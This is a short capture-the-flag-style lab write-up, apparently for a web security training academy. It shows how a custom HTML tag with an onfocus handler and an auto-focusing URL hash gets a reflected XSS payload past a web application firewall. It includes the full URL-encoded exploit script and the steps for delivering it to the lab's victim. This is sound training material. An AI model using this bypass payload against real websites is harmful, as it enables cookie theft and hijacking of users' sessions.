## ðŸ§ª Lab: Creating a Custom XSS Tag to Bypass WAF

This lab demonstrates how to create an XSS attack using a custom tag to bypass a web application firewall (WAF) and execute a payload.

> **Note:** The solution must not require user interaction. The payload should execute automatically when the page loads.

---

### Steps:

1. Navigate to the exploit server and insert the following code, replacing `YOUR-LAB-ID` with your lab identifier:

    ```html
    <script>
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>
    ```

2. Click **Store** and then **Deliver exploit to victim**.

This injection creates a custom tag with the ID `x`, containing an `onfocus` event handler that triggers the `alert()` function. The hash at the end of the URL automatically focuses on this element when the page loads, causing the payload to execute.
